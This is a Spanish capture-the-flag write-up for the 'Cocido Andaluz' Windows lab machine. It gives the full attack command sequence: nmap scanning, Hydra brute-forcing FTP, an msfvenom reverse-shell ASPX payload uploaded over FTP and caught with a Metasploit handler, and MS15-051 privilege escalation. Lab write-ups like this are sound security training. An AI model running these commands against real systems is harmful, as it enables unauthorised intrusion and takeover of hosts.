---
tags:
  - Cybersecurity
  - Labs
  - HackMyVM
  - Easy
  - Windows
  - Hydra
  - FTP
  - PrivilegeEscalation
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#FTP|FTP]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]

---
# Resolviendo la máquina Cocido Andaluz

>En esta publicación, comparto cómo resolví la máquina **Cocido Andaluz** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/21).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 192.168.1.135 `

![[Pasted image 20250719200630.png]]

*TTL=128* -> **Windows**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.135 -oG allPorts`

![[Pasted image 20250719200743.png]]

`nmap -p21,80,135,139,445,49152,49153,49154,49155,49156,49157,49158 -sCV 192.168.1.135 -oN targeted`

![[Pasted image 20250719201140.png]]

---
## Explotación
### Hydra

Se realiza *fuerza bruta* al servicio **FTP**.

`hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt 192.168.1.135 ftp`

![[Pasted image 20250719212815.png]]

Se genera un *payload malicioso*.

`msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.127 LPORT=1234 -f aspx > shell.aspx`
### FTP

Se accede al servicio **FTP**, con las contraseñas descubiertas anteriormente.

`ftp info@192.168.1.135`

![[Pasted image 20250719213150.png]]

Se sube el archivo generado anteriormente.

`put shell.aspx`

Nos ponemos a la escucha en el puerto 1234 para recibir la *reverse shell*.

`vin handler.rc`

```
use multi/handler
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.1.127
set LPORT 1234
run
```

`msfconsole -r handler.rc`

![[Pasted image 20250719214306.png]]

`http://192.168.1.135/shell.aspx`

![[Pasted image 20250719214425.png]]

`background`

`sessions -u 1`

`sessions 2`

![[Pasted image 20250719214645.png]]
### Escalada de Privilegios

*Exploit* para enumerar los usuarios actualmente conectados en un sistema **Windows**.

`post/multi/recon/local_exploit_suggester`

```
search local_exploit_suggester
use 0 | use post/multi/recon/local_exploit_suggester
show options
set SESSION 2
exploit
```

![[Pasted image 20250720102647.png]]

*Exploit* para explotar una vulnerabilidad de escalada de privilegios en **Windows**, identificada como **MS15-051**.

`exploit/windows/local/ms15_051_client_copy_image`

```
search exploit/windows/local/ms15_051_client_copy_image
use 0 | use exploit/windows/local/ms15_051_client_copy_image
show options
set SESSION 2
exploit
```

![[Pasted image 20250720102815.png]]

`sessions 4`

`getuid`

![[Pasted image 20250720102902.png]]

---